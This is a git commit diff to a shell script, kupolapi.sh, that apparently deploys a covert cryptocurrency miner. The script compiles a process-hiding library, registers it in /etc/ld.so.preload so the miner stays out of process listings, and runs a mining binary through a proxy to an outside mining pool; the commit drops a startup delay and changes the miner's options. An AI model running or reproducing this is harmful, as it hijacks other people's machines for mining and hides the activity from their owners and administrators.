b624cdd15ea02af878582a38935d2641cfb485df
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-24 08:17:28 +0700

    Update kupolapi.sh

--- kupolapi.sh
+++ kupolapi.sh
@@ -1,5 +1,4 @@
 #!/bin/sh
-sleep 15m
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
@@ -44,4 +43,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-DENT)@ethash.kupool.com:443 >/dev/null 2>&1
+./graftcp/graftcp ./bezzHash --url=prodent.LAPI@ethash.kupool.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
